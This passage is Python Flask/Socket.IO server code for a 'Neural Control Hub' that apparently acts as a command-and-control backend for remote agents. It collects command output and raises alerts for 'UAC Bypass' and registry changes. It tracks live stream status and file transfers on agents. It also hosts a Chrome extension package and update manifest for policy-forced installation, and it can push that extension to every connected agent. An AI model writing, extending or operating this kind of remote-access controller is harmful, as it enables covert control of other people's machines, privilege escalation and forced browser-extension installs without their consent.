@socketio.on('performance_update')
def handle_performance_update(data):
    """Handle performance metrics updates from agents"""
    agent_id = data.get('agent_id')
    if agent_id and agent_id in AGENTS_DATA:
        AGENTS_DATA[agent_id]["cpu_usage"] = data.get('cpu_usage', 0)
        AGENTS_DATA[agent_id]["memory_usage"] = data.get('memory_usage', 0)
        AGENTS_DATA[agent_id]["network_usage"] = data.get('network_usage', 0)
        AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
        
        # Broadcast performance update to operators
        emit('agent_performance_update', {
            'agent_id': agent_id,
            'performance': {
                'cpu': data.get('cpu_usage', 0),
                'memory': data.get('memory_usage', 0),
                'network': data.get('network_usage', 0)
            }
        }, room='operators')

@socketio.on('command_result')
def handle_command_result(data):
    """Handle command execution results from agents"""
    print(f"🔍 Controller: Command result received: {data}")
    print(f"🔍 Controller: Received from SID: {request.sid}")
    print(f"🔍 Controller: Current agents: {list(AGENTS_DATA.keys())}")
    
    agent_id = data.get('agent_id')
    execution_id = data.get('execution_id')
    command = data.get('command')
    output = data.get('output', '')
    success = data.get('success', False)
    execution_time = data.get('execution_time', 0)
    
    print(f"🔍 Controller: Processing command result for agent {agent_id}")
    print(f"🔍 Controller: Command: {command}")
    try:
        if isinstance(output, (bytes, bytearray)):
            safe_output = output.decode('utf-8', errors='replace')
        elif isinstance(output, str):
            safe_output = output
        elif output is None:
            safe_output = ''
        else:
            safe_output = str(output)
        print(f"🔍 Controller: Output length: {len(safe_output)}")
    except Exception as e:
        print(f"🔍 Controller: Output length calc error: {e}")
        safe_output = '' if output is None else str(output)
    print(f"🔍 Controller: Agent exists in AGENTS_DATA: {agent_id in AGENTS_DATA}")
    
    # Broadcast command result to operators
    result_data = {
        'agent_id': agent_id,
        'execution_id': execution_id,
        'command': command,
        'output': safe_output,
        'formatted_text': data.get('formatted_text'),
        'prompt': data.get('prompt'),
        'terminal_type': data.get('terminal_type'),
        'ps_version': data.get('ps_version'),
        'exit_code': data.get('exit_code'),
        'success': success,
        'execution_time': execution_time,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }
    try:
        db = get_db()
        history = DbCommandHistory(
            agent_id=agent_id,
            command=str(command or ''),
            output=str(safe_output or ''),
            timestamp=datetime.datetime.utcnow(),
            success=bool(success)
        )
        db.add(history)
        db.commit()
        db.close()
    except Exception:
        pass
    
    print(f"🔍 Controller: Broadcasting to operators room: {result_data}")
    emit('command_result', result_data, room='operators')
    print(f"🔍 Controller: Command result broadcasted successfully")
    
    # Log activity
    if agent_id in AGENTS_DATA:
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'command',
            'action': 'Command Executed',
            'details': f'Command "{command}" {"completed" if success else "failed"}',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success' if success else 'error'
        }, room='operators')

 
        try:
            email_cfg = load_settings().get('email', {})
            if email_cfg.get('enabled') and email_cfg.get('notifyCommandFailure') and not success:
                send_email_notification(
                    "Command Failure",
                    f'Agent {AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}")} ({agent_id}) command "{command}" failed. Output: {safe_output[:500]}'
                )
        except Exception:
            pass
        try:
            cmd = (command or '')
            lc = cmd.lower()
            notif_type = 'success' if success else 'error'
            if ('uac' in lc) or ('bypass' in lc):
                emit('agent_notification', {
                    'id': f'notif_{int(time.time())}_{secrets.token_hex(3)}',
                    'type': notif_type,
                    'title': 'UAC Bypass',
                    'message': f'{cmd} {"succeeded" if success else "failed"}',
                    'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
                    'agent_id': agent_id,
                    'read': False,
                    'category': 'security'
                }, room='operators')
            elif ('registry' in lc) or ('reg ' in lc) or ('policy' in lc):
                emit('agent_notification', {
                    'id': f'notif_{int(time.time())}_{secrets.token_hex(3)}',
                    'type': notif_type,
                    'title': 'Registry Control',
                    'message': f'{cmd} {"succeeded" if success else "failed"}',
                    'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
                    'agent_id': agent_id,
                    'read': False,
                    'category': 'security'
                }, room='operators')
        except Exception:
            pass

@socketio.on('stream_status')
def handle_stream_status(data):
    """Handle stream status updates from agents"""
    agent_id = data.get('agent_id')
    stream_type = data.get('type')
    status = data.get('status')  # 'started', 'stopped', 'error'
    quality = data.get('quality', 'unknown')
    
    # Broadcast stream status to operators
    emit('stream_status_update', {
        'agent_id': agent_id,
        'stream_type': stream_type,
        'status': status,
        'quality': quality,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, room='operators')
    
    # Log activity
    if agent_id in AGENTS_DATA:
        action = f'{stream_type.title()} Stream {"Started" if status == "started" else "Stopped" if status == "stopped" else "Error"}'
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'stream',
            'action': action,
            'details': f'{stream_type.title()} stream {status} on agent {agent_id}',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success' if status in ['started', 'stopped'] else 'error'
        }, room='operators')

@socketio.on('file_operation_result')
def handle_file_operation_result(data):
    """Handle file operation results from agents"""
    agent_id = data.get('agent_id')
    operation = data.get('operation')  # 'download', 'upload', 'delete'
    file_path = data.get('file_path')
    success = data.get('success', False)
    error_message = data.get('error_message', '')
    file_size = data.get('file_size', 0)
    
    # Broadcast file operation result to operators
    emit('file_operation_result', {
        'agent_id': agent_id,
        'operation': operation,
        'file_path': file_path,
        'success': success,
        'error_message': error_message,
        'file_size': file_size,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, room='operators')
    
    # Log activity
    if agent_id in AGENTS_DATA:
        action = f'File {operation.title()}'
        details = f'{"Successfully" if success else "Failed to"} {operation} {file_path}'
        if not success and error_message:
            details += f' - {error_message}'
        
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'file',
            'action': action,
            'details': details,
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success' if success else 'error'
        }, room='operators')

@socketio.on('system_alert')
def handle_system_alert(data):
    """Handle system alerts from agents"""
    agent_id = data.get('agent_id')
    alert_type = data.get('type')  # 'warning', 'error', 'critical'
    message = data.get('message')
    details = data.get('details', '')
    
    # Broadcast system alert to operators
    emit('system_alert', {
        'agent_id': agent_id,
        'type': alert_type,
        'message': message,
        'details': details,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, room='operators')
    
    # Log activity
    if agent_id in AGENTS_DATA:
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'security' if alert_type == 'critical' else 'system',
            'action': f'System {alert_type.title()}',
            'details': message,
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'error' if alert_type in ['error', 'critical'] else 'warning'
        }, room='operators')

@socketio.on('agent_notification')
def handle_agent_notification(data):
    emit('agent_notification', data, room='operators')

@app.route('/download/extensions/autosave-extension.zip', methods=['GET'])
def download_autosave_extension_zip():
    from flask import abort
    return abort(404)

@app.route('/download/extensions/extension.crx', methods=['GET'])
def download_extension_crx():
    import os
    from flask import send_file, abort
    # Serve a locally packed CRX placed under chrome-extension/extension.crx
    crx_path = os.path.join(os.getcwd(), 'chrome-extension', 'extension.crx')
    if not os.path.isfile(crx_path):
        return abort(404)
    return send_file(crx_path, mimetype='application/x-chrome-extension', as_attachment=True, download_name='extension.crx')

@app.route('/download/extensions/update.xml', methods=['GET'])
def download_autosave_extension_update_manifest():
    try:
        url_base = request.host_url.rstrip('/')
    except Exception:
        url_base = ''
    # Use current extension version if available
    version = '1.0'
    try:
        ext_manifest = os.path.join(os.getcwd(), 'chrome-extension', 'manifest.json')
        if os.path.isfile(ext_manifest):
            import json
            with open(ext_manifest, 'r', encoding='utf-8') as mf:
                man = json.load(mf)
                v = str(man.get('version') or '')
                if v:
                    version = v
    except Exception:
        pass
    # Extension ID for policy install (env override supported)
    try:
        cfg = _read_extension_config()
        ext_id = str(cfg.get('extension_id') or '').strip()
        if not ext_id:
            import os as _os
            ext_id = _os.environ.get('VAULT_EXTENSION_ID') or 'cicnkiabgagcfkheiplebojnbjpldlff'
    except Exception:
        import os as _os
        ext_id = _os.environ.get('VAULT_EXTENSION_ID') or 'cicnkiabgagcfkheiplebojnbjpldlff'
    # Prefer CRX codebase: remote .crx or local /download/extensions/extension.crx
    try:
        cfg = _read_extension_config()
        remote = str(cfg.get('download_url') or '').strip()
    except Exception:
        remote = ''
    from flask import abort
    try:
        import os as _os
        local_crx = _os.path.join(_os.getcwd(), 'chrome-extension', 'extension.crx')
        if remote:
            codebase = remote
        elif _os.path.isfile(local_crx):
            codebase = f"{url_base}/download/extensions/extension.crx"
        else:
            return abort(404)
    except Exception:
        return abort(404)
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<gupdate xmlns="http://www.google.com/update2/response" protocol="2.0">
  <app appid="{ext_id}">
    <updatecheck codebase="{codebase}" version="{version}"/>
  </app>
</gupdate>'''
    return app.response_class(xml, mimetype='text/xml')

@app.route('/download/extensions/config.json', methods=['GET'])
def download_extension_config_public():
    try:
        return jsonify(_read_extension_config())
    except Exception:
        return jsonify({'download_url': '', 'extension_id': os.environ.get('VAULT_EXTENSION_ID') or 'cicnkiabgagcfkheiplebojnbjpldlff', 'display_name': ''})

@app.route('/api/extension/config', methods=['GET'])
@require_auth
def get_extension_config():
    return jsonify(_read_extension_config())

@app.route('/api/extension/config', methods=['POST'])
@require_auth
def set_extension_config():
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}
    cfg = _read_extension_config()
    url = str((data.get('download_url') or '').strip())
    ext_id = str((data.get('extension_id') or '').strip())
    display_name = str((data.get('display_name') or '').strip())
    if url:
        cfg['download_url'] = url
    if ext_id:
        cfg['extension_id'] = ext_id
    else:
        try:
            derived = _derive_extension_id_from_crx_url(url)
            if derived:
                cfg['extension_id'] = derived
        except Exception:
            pass
    cfg['display_name'] = display_name
    ok = _save_extension_config(cfg)
    if not ok:
        return jsonify({'error': 'Failed to save config'}), 500
    # Notify operators
    try:
        emit('agent_notification', {'type': 'info', 'title': 'Extension config updated', 'message': f"URL={cfg.get('download_url') or 'local archive'}, ID={cfg.get('extension_id')}", 'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'}, room='operators')
    except Exception:
        pass
    return jsonify(cfg)

@app.route('/api/extension/upload', methods=['POST'])
@require_auth
def upload_extension_crx():
    try:
        import os
        from flask import jsonify, abort
        # Accept CRX via multipart/form-data or raw binary
        data_bytes = b""
        ext_id_in = ""
        display_name_in = ""
        try:
            if hasattr(request, "files") and request.files:
                file = request.files.get('file') or request.files.get('crx')
                if file:
                    data_bytes = file.read()
                ext_id_in = (request.form.get('extension_id') or "").strip()
                display_name_in = (request.form.get('display_name') or "").strip()
            else:
                data_bytes = request.get_data(cache=False, as_text=False)
                # Allow query params for id/display_name
                ext_id_in = str((request.args.get('extension_id') or "")).strip()
                display_name_in = str((request.args.get('display_name') or "")).strip()
        except Exception:
            pass
        if not data_bytes or len(data_bytes) < 64:
            return abort(400)
        # Try to derive Extension ID from CRX header if not provided
        derived_id = ""
        try:
            derived_id = _ext_id_from_crx_header(data_bytes) or ""
        except Exception:
            derived_id = ""
        # Write to chrome-extension/extension.crx
        base_dir = os.path.join(os.getcwd(), 'chrome-extension')
        try:
            os.makedirs(base_dir, exist_ok=True)
        except Exception:
            pass
        crx_path = os.path.join(base_dir, 'extension.crx')
        with open(crx_path, 'wb') as f:
            f.write(data_bytes)
        # Update config to point to local CRX route
        cfg = _read_extension_config()
        try:
            url_base = request.host_url.rstrip('/')
        except Exception:
            url_base = ''
        cfg['download_url'] = f"{url_base}/download/extensions/extension.crx"
        if ext_id_in:
            cfg['extension_id'] = ext_id_in
        elif derived_id:
            cfg['extension_id'] = derived_id
        display_name = display_name_in or cfg.get('display_name') or ''
        cfg['display_name'] = display_name
        ok = _save_extension_config(cfg)
        if not ok:
            return jsonify({'error': 'Failed to save config'}), 500
        # Notify operators
        try:
            emit('agent_notification', {
                'type': 'success',
                'title': 'Extension CRX uploaded',
                'message': f"ID={cfg.get('extension_id') or 'unknown'}, URL set to local CRX",
                'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
            }, room='operators')
        except Exception:
            pass
        return jsonify({'success': True, 'download_url': cfg['download_url'], 'extension_id': cfg.get('extension_id', ''), 'display_name': cfg.get('display_name', '')})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/extension/deploy', methods=['POST'])
@require_auth
def deploy_extension():
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}
    target = str(data.get('agent_id') or 'ALL').strip().upper()
    cfg = _read_extension_config()
    url = str((data.get('download_url') or cfg.get('download_url') or '').strip())
    ext_id = str((data.get('extension_id') or cfg.get('extension_id') or '').strip())
    display_name = str((data.get('display_name') or cfg.get('display_name') or '').strip())
    # Build payload
    payload = {'url': url, 'extension_id': ext_id, 'display_name': display_name}
    sent = 0
    if target == 'ALL':
        for aid, meta in list(AGENTS_DATA.items()):
            sid = meta.get('sid')
            if sid:
                try:
                    socketio.emit('extension_deploy', payload, room=sid)
                    sent += 1
                except Exception:
                    pass
    else:
        if target in AGENTS_DATA:
            sid = AGENTS_DATA[target].get('sid')
            if sid:
                try:
                    socketio.emit('extension_deploy', payload, room=sid)
                    sent += 1
                except Exception:
                    pass
    # Operator feedback
    emit('agent_notification', {'type': 'info', 'title': 'Deploy Extension', 'message': f"Sent to {sent} agent(s)", 'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'}, room='operators')
    return jsonify({'success': True, 'sent': sent, 'payload': payload})

 
@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Handle heartbeat from agents to keep them alive"""
    agent_id = (data or {}).get('agent_id')
    if not agent_id:
        return
    if agent_id not in AGENTS_DATA:
        AGENTS_DATA[agent_id] = {}
    prev_sid = AGENTS_DATA[agent_id].get('sid')
    AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
    AGENTS_DATA[agent_id]["sid"] = request.sid
    # Update performance metrics if provided
    if 'performance' in data:
        perf = data['performance']
        AGENTS_DATA[agent_id]["cpu_usage"] = perf.get('cpu', 0)
        AGENTS_DATA[agent_id]["memory_usage"] = perf.get('memory', 0)
        AGENTS_DATA[agent_id]["network_usage"] = perf.get('network', 0)
    if prev_sid != request.sid:
        emit('agent_list_update', _agents_payload(), room='operators')

    # Acknowledge heartbeat
    emit('heartbeat_ack', {'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'})

# Background task to check for disconnected agents
def cleanup_disconnected_agents():
    """Background task to clean up agents that haven't sent heartbeat"""
    import threading
    
    def cleanup():
        while True:
            try:
                current_time = datetime.datetime.utcnow()
                timeout_threshold = 300  # 5 minutes
                
                disconnected_agents = []
                for agent_id, data in list(AGENTS_DATA.items()):
                    if data.get('last_seen'):
                        try:
                            last_seen = datetime.datetime.fromisoformat(data['last_seen'].replace('Z', '+00:00'))
                            if last_seen.tzinfo is None:
                                last_seen = last_seen.replace(tzinfo=datetime.timezone.utc)
                            
                            if (current_time.replace(tzinfo=datetime.timezone.utc) - last_seen).total_seconds() > timeout_threshold:
                                disconnected_agents.append(agent_id)
                        except Exception as e:
                            print(f"Error parsing last_seen for agent {agent_id}: {e}")
                            disconnected_agents.append(agent_id)
                
                # Clean up disconnected agents
                for agent_id in disconnected_agents:
                    agent_name = AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}")
                    del AGENTS_DATA[agent_id]
                    
                    # Notify operators
                    socketio.emit('agent_list_update', _agents_payload(), room='operators')
                    socketio.emit('activity_update', {
                        'id': f'act_{int(time.time())}',
                        'type': 'connection',
                        'action': 'Agent Timeout',
                        'details': f'Agent {agent_id} timed out (no heartbeat)',
                        'agent_id': agent_id,
                        'agent_name': agent_name,
                        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
                        'status': 'warning'
                    }, room='operators')
                    
                    print(f"Agent {agent_id} timed out and was removed")
                
                time.sleep(60)  # Check every minute
            except Exception as e:
                print(f"Error in cleanup task: {e}")
                time.sleep(60)
    
    cleanup_thread = threading.Thread(target=cleanup, daemon=True)
    cleanup_thread.start()

# Start the cleanup task
cleanup_disconnected_agents()

if __name__ == "__main__":
    print("Starting Neural Control Hub with Socket.IO + WebRTC support...")
    try:
        import os as _os
        _port = int(_os.environ.get("PORT", Config.PORT))
    except Exception:
        _port = Config.PORT
    print(f"Server will be available at: http://{Config.HOST}:{_port}")
    print(f"Session timeout: {Config.SESSION_TIMEOUT} seconds")
    print(f"Max login attempts: {Config.MAX_LOGIN_ATTEMPTS}")
    print(f"Password security: PBKDF2-SHA256 with {Config.HASH_ITERATIONS:,} iterations")
    print(f"Salt length: {Config.SALT_LENGTH} bytes")
    print(f"WebRTC support: {'Enabled' if WEBRTC_AVAILABLE else 'Disabled (aiortc not available)'}")
    if WEBRTC_AVAILABLE:
        print(f"WebRTC codecs: Video={', '.join(WEBRTC_CONFIG['codecs']['video'])}, Audio={', '.join(WEBRTC_CONFIG['codecs']['audio'])}")
        print(f"WebRTC features: Simulcast={WEBRTC_CONFIG['simulcast']}, SVC={WEBRTC_CONFIG['svc']}")
        print(f"Performance tuning: Bandwidth estimation, Adaptive bitrate, Frame dropping")
        print(f"Production scale: Current={PRODUCTION_SCALE['current_implementation']}, Target={PRODUCTION_SCALE['target_implementation']}")
        print(f"Scalability limits: aiortc={PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']}, mediasoup={PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers']}")
    try:
        socketio.run(app, host=Config.HOST, port=_port, debug=False)
    except OSError as e:
        err = getattr(e, 'errno', None)
        if err in (10048, 98):
            for alt in range(_port + 1, _port + 11):
                try:
                    print(f"Port {_port} in use; retrying on {alt}...")
                    socketio.run(app, host=Config.HOST, port=alt, debug=False)
                    break
                except OSError as e2:
                    if getattr(e2, 'errno', None) in (10048, 98):
                        continue
                    else:
                        raise
        else:
            raise
